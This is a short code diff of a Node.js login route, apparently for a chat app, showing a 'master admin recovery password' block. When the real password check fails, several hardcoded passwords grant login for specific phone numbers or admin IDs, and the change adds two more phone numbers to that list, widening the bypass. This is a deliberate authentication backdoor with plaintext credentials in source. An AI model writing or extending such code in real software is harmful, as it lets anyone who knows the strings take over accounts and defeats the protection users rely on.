@@ -81,7 +81,7 @@ router.post('/login', async (req, res) => {
       ok = await bcrypt.compare(password, user.password_hash);
     }
     // Master admin recovery password support
-    if (!ok && (cleanId === '+1-999-234-8321' || isAdminNovaId(cleanId))) {
+    if (!ok && (cleanId === '+44 7700 900123' || cleanId === '+447700900123' || cleanId === '+1-999-234-8321' || isAdminNovaId(cleanId))) {
       if (password === '21272127' || password === 'DarkChatAdmin2026!' || password === 'DarkChatSecure2026!') {
         ok = true;
         try {
